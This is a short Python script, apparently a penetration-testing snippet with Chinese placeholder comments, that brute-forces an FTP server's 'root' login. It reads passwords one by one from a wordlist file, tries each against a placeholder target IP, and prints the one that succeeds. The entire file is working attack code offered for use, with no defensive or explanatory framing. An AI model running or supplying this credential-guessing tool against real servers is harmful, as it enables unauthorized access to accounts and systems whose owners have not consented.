"""
#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""

def main():
    from ftplib import FTP

    wordlist = open('字典路径', 'r')
    user_login = "root"

    def getPassword(password):
        try:
            ftp = FTP("目标ip")
            ftp.login(user_login, password)
            print("user password:", password)
            return True
        except Exception:
            return False

    passwords = wordlist.readlines()
    for password in passwords:
        password = password.strip()
        print("test password:", password)
        if (getPassword(password)):
            break
    wordlist.close()
    
    pass
    
    
if __name__ == '__main__':
    main()